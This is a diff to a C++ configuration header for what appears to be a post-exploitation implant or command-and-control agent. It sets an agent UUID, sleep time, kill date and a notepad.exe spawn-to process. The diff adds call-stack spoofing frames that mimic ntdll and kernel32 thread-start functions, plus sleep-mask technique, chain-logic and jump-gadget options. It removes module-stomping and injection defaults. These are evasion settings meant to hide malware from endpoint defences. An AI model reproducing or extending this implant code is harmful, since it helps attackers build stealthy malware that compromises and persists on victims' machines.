@@ -68,6 +68,8 @@
 #define CFG_HOST_ACTID_ADD 0x10
 #define CFG_HOST_ACTID_RM  0x20
 
+#define TASK_HEADER_SIZE ( sizeof(ULONG) + sizeof(CHAR) + 8 + sizeof(ULONG) )
+
 #ifdef DEBUG
 #define SendDbgMsg( x, ... )  Self->Pkg->FmtMsg( CALLBACK_NO_PRE_MSG, x, ##__VA_ARGS__ )
 #define SendDbgErr( x, ... )  Self->Pkg->FmtMsg( CALLBACK_NO_PRE_MSG, x, ##__VA_ARGS__ )
@@ -94,6 +96,8 @@
 #define DEF64( x ) ( * ( UINT64* ) ( x ) )
 
 /*============== [ Casting ] ==============*/
+
+#define C_PTR_AS( type, ptr ) reinterpret_cast<type>( ptr )
 
 #define PTR( x )    reinterpret_cast<PVOID>( x )
 #define U_PTR( x )  reinterpret_cast<UPTR>( x )
@@ -192,7 +196,7 @@
 #define KH_INJECT_SPAWN    0x200
 
 #ifndef KH_AGENT_UUID
-#define KH_AGENT_UUID "f47ac10b-58cc-4372-a567-0e02b2c3d479"
+#define KH_AGENT_UUID "f47ac10"
 #endif // KH_AGENT_UUID
 
 #ifndef KH_SLEEP_TIME
@@ -215,14 +219,6 @@
 #define KH_KILLDATE_ENABLED FALSE
 #endif // KH_KILLDATE_ENABLED
 
-#ifndef KH_STOMP_MODULE
-#define KH_STOMP_MODULE L"chakra.dll"
-#endif 
-
-#ifndef KH_INJECTION_ID
-#define KH_INJECTION_ID INJECTION_STANDARD
-#endif
-
 #ifndef KH_SPAWNTO_X64
 #define KH_SPAWNTO_X64 L"C:\\Windows\\System32\\notepad.exe"
 #endif // KH_SPAWNTO_X64
@@ -243,13 +239,125 @@
 #define KH_SYSCALL 0
 #endif // KH_SYSCALL
 
+// Frame 1
+#ifndef KH_SPOOF_FRAME_1_MODULE
+#define KH_SPOOF_FRAME_1_MODULE   "ntdll"
+#endif
+
+#ifndef KH_SPOOF_FRAME_1_FUNC
+#define KH_SPOOF_FRAME_1_FUNC     "RtlUserThreadStart"
+#endif
+
+#ifndef KH_SPOOF_FRAME_1_OFFSET
+#define KH_SPOOF_FRAME_1_OFFSET   0x21
+#endif
+
+// Frame 2
+#ifndef KH_SPOOF_FRAME_2_MODULE
+#define KH_SPOOF_FRAME_2_MODULE   "kernel32"
+#endif
+
+#ifndef KH_SPOOF_FRAME_2_FUNC
+#define KH_SPOOF_FRAME_2_FUNC     "BaseThreadInitThunk"
+#endif
+
+#ifndef KH_SPOOF_FRAME_2_OFFSET
+#define KH_SPOOF_FRAME_2_OFFSET   0x14
+#endif
+
+// Frame 3
+#ifndef KH_SPOOF_FRAME_3_MODULE
+#define KH_SPOOF_FRAME_3_MODULE   nullptr
+#endif
+
+#ifndef KH_SPOOF_FRAME_3_FUNC
+#define KH_SPOOF_FRAME_3_FUNC     nullptr
+#endif
+
+#ifndef KH_SPOOF_FRAME_3_OFFSET
+#define KH_SPOOF_FRAME_3_OFFSET   0x0
+#endif
+
+// Frame 4
+#ifndef KH_SPOOF_FRAME_4_MODULE
+#define KH_SPOOF_FRAME_4_MODULE   nullptr
+#endif
+
+#ifndef KH_SPOOF_FRAME_4_FUNC
+#define KH_SPOOF_FRAME_4_FUNC     nullptr
+#endif
+
+#ifndef KH_SPOOF_FRAME_4_OFFSET
+#define KH_SPOOF_FRAME_4_OFFSET   0x0
+#endif
+
+// Frame 5
+#ifndef KH_SPOOF_FRAME_5_MODULE
+#define KH_SPOOF_FRAME_5_MODULE   nullptr
+#endif
+
+#ifndef KH_SPOOF_FRAME_5_FUNC
+#define KH_SPOOF_FRAME_5_FUNC     nullptr
+#endif
+
+#ifndef KH_SPOOF_FRAME_5_OFFSET
+#define KH_SPOOF_FRAME_5_OFFSET   0x0
+#endif
+
+// Frame 6
+#ifndef KH_SPOOF_FRAME_6_MODULE
+#define KH_SPOOF_FRAME_6_MODULE   nullptr
+#endif
+
+#ifndef KH_SPOOF_FRAME_6_FUNC
+#define KH_SPOOF_FRAME_6_FUNC     nullptr
+#endif
+
+#ifndef KH_SPOOF_FRAME_6_OFFSET
+#define KH_SPOOF_FRAME_6_OFFSET   0x0
+#endif
+
+// Frame 7
+#ifndef KH_SPOOF_FRAME_7_MODULE
+#define KH_SPOOF_FRAME_7_MODULE   nullptr
+#endif
+
+#ifndef KH_SPOOF_FRAME_7_FUNC
+#define KH_SPOOF_FRAME_7_FUNC     nullptr
+#endif
+
+#ifndef KH_SPOOF_FRAME_7_OFFSET
+#define KH_SPOOF_FRAME_7_OFFSET   0x0
+#endif
+
+// Frame 8
+#ifndef KH_SPOOF_FRAME_8_MODULE
+#define KH_SPOOF_FRAME_8_MODULE   nullptr
+#endif
+
+#ifndef KH_SPOOF_FRAME_8_FUNC
+#define KH_SPOOF_FRAME_8_FUNC     nullptr
+#endif
+
+#ifndef KH_SPOOF_FRAME_8_OFFSET
+#define KH_SPOOF_FRAME_8_OFFSET   0x0
+#endif
+
 #ifndef KH_CHUNKSIZE
 #define KH_CHUNKSIZE 0x500000 //5Mb
 #endif // KH_CHUNKSIZE
 
-#ifndef KH_SLEEP_MASK
-#define KH_SLEEP_MASK eMask::Timer
-#endif // KH_SLEEP_MASK
+#ifndef KH_SLEEP_MASK_TECHNIQUE
+#define KH_SLEEP_MASK_TECHNIQUE eMask::Timer
+#endif // KH_SLEEP_MASK_TECHNIQUE
+
+#ifndef KH_SLEEP_MASK_CHAIN_LOGIC
+#define KH_SLEEP_MASK_CHAIN_LOGIC 0
+#endif // KH_SLEEP_MASK_CHAIN_LOGIC
+
+#ifndef KH_SLEEP_MASK_JMP_GADGET
+#define KH_SLEEP_MASK_JMP_GADGET eJmpReg::vRbx
+#endif // KH_SLEEP_MASK_JMP_GADGET
 
 #define x64_OPCODE_RET			0xC3
 #define x64_OPCODE_MOV			0xB8
